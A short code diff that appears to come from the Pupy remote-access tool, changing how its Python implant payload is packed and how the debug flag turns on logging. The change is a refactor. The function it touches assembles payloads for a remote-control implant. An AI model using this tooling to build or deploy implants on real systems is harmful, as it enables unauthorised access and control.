@@ -21,20 +21,17 @@ def getLinuxImportedModules():
     return lines
 
 def pack_py_payload(conf, debug=False):
-    print colorize('[+] ','green')+'generating payload ...'
+    print colorize('[+] ','green')+'generating PY payload ...'
     fullpayload = []
 
     with open(os.path.join(ROOT, 'packages', 'all', 'pupyimporter.py')) as f:
         pupyimportercode = f.read()
 
-    if debug:
-        pupyimportercode = pupyimportercode.replace('__debug = False', '__debug = True')
-
     fullpayload.append(
         '\n'.join([
             dependencies.loader(pupyimportercode, 'pupyimporter'),
             'import pupyimporter',
-            'pupyimporter.install()',
+            'pupyimporter.install(debug={})'.format(str(debug)),
             dependencies.importer('network', path=ROOT),
             dependencies.importer((
                 'rpyc', 'pyasn1', 'rsa',
@@ -46,10 +43,15 @@ def pack_py_payload(conf, debug=False):
     with open(os.path.join(ROOT,'pp.py')) as f:
         code = f.read()
 
-    if debug:
-        code = code.replace('logger.setLevel(logging.WARNING)', 'logger.setLevel(logging.DEBUG)')
-
     code = re.sub(r'LAUNCHER\s*=\s*.*\n(#.*\n)*LAUNCHER_ARGS\s*=\s*.*', conf.replace('\\','\\\\'), code)
+
+    if debug:
+        fullpayload = [
+            'import logging',
+            'logging.basicConfig()',
+            'logging.getLogger().setLevel(logging.DEBUG)'
+        ] + fullpayload
+
     fullpayload.append(code+'\n')
 
     payload = '\n'.join(fullpayload) + '\n'
